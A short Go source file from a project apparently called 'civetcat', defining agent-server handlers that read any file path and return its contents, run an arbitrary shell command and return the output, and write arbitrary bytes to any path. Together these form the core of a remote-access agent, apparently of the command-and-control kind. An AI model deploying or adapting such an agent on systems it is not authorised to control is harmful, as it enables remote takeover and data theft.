package agent_server

import (
	"civetcat/pb"
	"civetcat/utils"
	"io/ioutil"
)

func DownLoad(path string) *pb.DeGeneralResp {
	file, err := ioutil.ReadFile(path)
	if err != nil {
		return &pb.DeGeneralResp{Success: false}
	}
	return &pb.DeGeneralResp{Success: true, Bytes: file}
}

func Shell(cmd string) *pb.DeGeneralResp {
	shell, err := utils.RunShell(cmd)
	if err != nil {
		return &pb.DeGeneralResp{
			Success: false,
			Body:    shell,
		}
	}
	return &pb.DeGeneralResp{
		Success: true,
		Body:    shell,
	}
}

func Upload(path string, data []byte) *pb.DeGeneralResp {
	err := ioutil.WriteFile(path, data, 00666)
	if err != nil {
		return &pb.DeGeneralResp{Success: false}
	}
	return &pb.DeGeneralResp{Success: true}
}
